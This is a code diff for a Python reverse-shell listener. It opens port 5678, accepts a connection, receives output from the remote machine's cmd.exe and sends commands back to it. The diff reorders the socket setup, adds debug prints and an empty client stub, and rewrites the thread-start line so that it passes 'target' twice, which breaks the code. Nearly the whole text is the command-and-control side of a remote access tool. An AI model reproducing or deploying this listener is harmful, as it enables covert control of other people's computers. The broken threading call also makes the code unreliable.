@@ -4,6 +4,17 @@ import time
 import os
 from colorama import Fore, Style
 
+
+host = "0.0.0.0"
+port = 5678
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((host, port))
+s.listen(5)
+print(Fore.YELLOW + f"[+] Listening on port {port}" + Style.RESET_ALL)
+
+
 # receive cmd.exe output from the client
 def shellreceiver(conn):
     while True:
@@ -18,7 +29,6 @@ def shellreceiver(conn):
             os._exit(0)
 
 
-
 # send commands to the client
 def shellsender(conn):
     while True:
@@ -29,27 +39,20 @@ def shellsender(conn):
             print(Fore.RED + "\n[!] Connection lost. Exiting..." + Style.RESET_ALL)
             conn.close()
             os._exit(0)
-            
-            
-            
-            
-
-host = "0.0.0.0"
-port = 5678
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind((host, port))
-s.listen(5)
-print(Fore.YELLOW + f"[+] Listening on port {port}" + Style.RESET_ALL)
+              
+def client(conn):
+    pass
+        
 
 conn, addr = s.accept()
+print(conn)
+print(addr)
 print(Fore.GREEN + f"[*] Accepted new connection from: {addr[0]}:{addr[1]}" + Style.RESET_ALL)
+
 
 # start threads
 main_thread = threading.Thread(target=shellreceiver, target=shellsender, args=(conn,), daemon=True)
 main_thread.start()
-
 
 # keep main thread alive
 while True:
